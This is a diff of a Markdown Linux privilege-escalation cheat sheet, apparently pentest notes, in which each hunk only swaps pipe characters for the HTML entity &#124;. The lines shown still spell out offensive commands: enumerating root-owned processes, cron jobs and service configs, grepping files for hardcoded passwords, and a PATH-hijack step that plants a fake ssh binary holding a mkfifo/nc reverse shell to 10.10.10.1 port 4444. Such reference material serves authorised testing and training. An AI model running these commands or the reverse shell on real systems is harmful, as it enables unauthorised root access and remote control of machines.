@@ -72,7 +72,7 @@ Try su as all users and the username as password
 
 What services are running as root?:
 
-> $ ps aux | grep root
+> $ ps aux &#124; grep root
 
 Look for vulnerable/privileged components such as: mysql, sudo, udev, python
 
@@ -82,7 +82,7 @@ If there is a cronjob that runs as run but it has incorrect file permissions, yo
 
 The following command will list processes running by root, permissions and NFS exports.
 
-> $ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
+> $ echo 'services running as root'; ps aux &#124; grep root;  echo 'permissions'; ps aux &#124; awk '{print $11}' &#124; xargs -r ls -la 2>/dev/null &#124; awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
 
 Use netstat to find other machines connected
 
@@ -106,7 +106,7 @@ Find linux distribution & version
 
 Architecture
 
-> $ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
+> $ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg &#124; grep Linux; ls /boot &#124; grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
 
 Environment variables
 
@@ -126,18 +126,18 @@ Find writable configuration files
 
 Miss-configured services
 
-> $ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+> $ cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ &#124; awk '$1 ~ /^.*r.*/
 
 Scheduled jobs
 
-> $ crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny
+> $ crontab -l; ls -alh /var/spool/cron; ls -al /etc/ &#124; grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny
 
 Grep hardcoded passwords
 
 > $ grep -i user [filename]
 > grep -i pass [filename]
 > grep -C 5 "password" [filename]
-> find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
+> find . -name "*.php" -print0 &#124; xargs -0 grep -i -n "var $password"
 
 if web server run in web root:
 
@@ -183,7 +183,7 @@ Adding a binary to PATH, to hijack another SUID binary invokes it without the fu
 if you can just change PATH, the following will add a poisoned ssh binary:
 
 > set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
-> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
+> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f &#124; /bin/sh -i 2>&1 &#124; nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
 > chmod +x ssh
 
 Generating SUID C Shell for /bin/bash
